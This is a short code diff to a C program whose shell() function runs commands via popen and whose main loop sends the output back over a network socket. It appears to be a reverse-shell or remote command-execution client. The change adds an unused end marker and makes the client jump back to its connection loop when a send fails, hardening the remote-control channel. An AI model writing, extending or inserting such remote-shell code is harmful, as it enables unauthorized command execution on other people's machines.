@@ -17,6 +17,8 @@ char* shell(char* cmd){
   fp = popen(cmd,"r");
   while(fgets(buff,sizeof(buff),fp)){
     size_t len = strlen(buff);
+    const char mark[] = "__END__";
+    size_t len_mark = strlen(mark);
     char *new_res =  realloc(res,size+len+1);
     res = new_res;
     memcpy(res+size,buff,len);
@@ -66,7 +68,12 @@ int main(){
             while (sent< len){
               printf("ss\n");
               ssize_t n = send(sock,out+sent,len-sent,0);
-              sent +=n;
+              if(n > 0){
+                  sent +=n;
+              }
+              else{
+                  goto connect_loop;
+              }
             }
             free(out);
 
